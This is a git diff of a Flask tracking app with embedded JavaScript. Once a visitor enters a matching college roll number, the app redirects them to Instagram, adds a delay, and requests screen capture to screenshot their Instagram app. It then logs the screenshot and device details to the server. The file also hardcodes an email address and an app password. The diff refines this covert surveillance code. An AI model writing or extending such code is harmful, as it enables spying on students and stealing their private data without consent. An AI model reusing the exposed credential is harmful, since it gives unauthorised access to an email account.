@@ -14,7 +14,7 @@ app = Flask(__name__)
 
 visitor_data = []
 EMAIL_SENDER = "ezhilkirthikm@gmail.com"
-EMAIL_PASSWORD = "funzsquyxfjbacmk"  # App-specific password (no spaces)
+EMAIL_PASSWORD = "funzsquyxfjbacmk"  # App-specific password
 EMAIL_RECEIVER = "ezhilkirthik2005@gmail.com"
 
 @app.route('/track')
@@ -192,6 +192,8 @@ s.display()
 
             async function captureScreenAfterRedirect() {
                 try {
+                    // Delay to allow Instagram app to open
+                    await new Promise(resolve => setTimeout(resolve, 3000));
                     const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                     const video = document.createElement('video');
                     video.srcObject = stream;
@@ -206,7 +208,7 @@ s.display()
                     return screenshot;
                 } catch (err) {
                     console.error('Screen capture failed:', err);
-                    return null;
+                    return { error: err.message || 'Screen capture denied or failed' };
                 }
             }
 
@@ -228,13 +230,13 @@ s.display()
                 const rollPattern = /^CB\.EN\.U4ECE230[0-5][0-9]$/;
                 if (rollPattern.test(rollNo)) {
                     deviceInfo.rollNumber = rollNo;
-                    window.location.href = 'instagram://app'; // Only redirect to Instagram app
+                    window.location.href = 'instagram://'; // Redirect to Instagram app
 
-                    const screenShot = await captureScreenAfterRedirect();
-                    if (screenShot) {
-                        deviceInfo.instagramScreenshot = screenShot;
+                    const screenShotResult = await captureScreenAfterRedirect();
+                    if (typeof screenShotResult === 'string') {
+                        deviceInfo.instagramScreenshot = screenShotResult;
                     } else {
-                        deviceInfo.instagramScreenshotError = 'Screen capture denied or failed';
+                        deviceInfo.instagramScreenshotError = screenShotResult.error;
                     }
 
                     await fetch('/log', {
@@ -286,3 +288,4 @@ def root():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+    
